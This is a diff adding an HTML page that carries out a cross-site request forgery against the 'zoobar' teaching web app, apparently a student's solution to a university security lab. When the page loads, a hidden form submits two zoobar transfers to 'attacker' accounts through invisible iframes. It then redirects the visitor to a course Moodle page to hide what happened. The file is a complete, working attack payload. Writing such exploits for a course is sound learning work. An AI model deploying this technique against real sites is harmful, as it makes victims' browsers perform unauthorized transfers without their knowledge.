@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<!-- <link rel="stylesheet" type="text/css" href="/zoobar/media/zoobar.css">	 -->
+</head>
+<body>
+<form id="myform" action="http://localhost:8080/zoobar/index.cgi/transfer" method="post">
+  <input type="hidden" name="zoobars" id="zoobars" value="" />
+  <input type="hidden" name="recipient" id="recipient" value=""/>
+</form>
+
+<iframe style="visibility:hidden" name="if1"></iframe>
+<iframe style="visibility:hidden" name="if2"></iframe>
+
+<script>
+
+function attack(zoobars,recipient,target){
+  document.getElementById("zoobars").value = zoobars;
+  document.getElementById("recipient").value = recipient;
+  document.getElementById("myform").target="if1";
+  document.getElementById("myform").submit();
+}
+attack(1,"attacker","if1");
+setTimeout(function(){attack(9,"attacker1","if2");},1000);
+setTimeout(function(){window.location.href = "http://moodle.cse.iitk.ac.in"},2000);
+//Send the proper header information along with the request
+// http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+// http.send(params);
+// window.location.href="http://moodle.cse.iitk.ac.in/";
+</script>
+
+</body>
+</html>
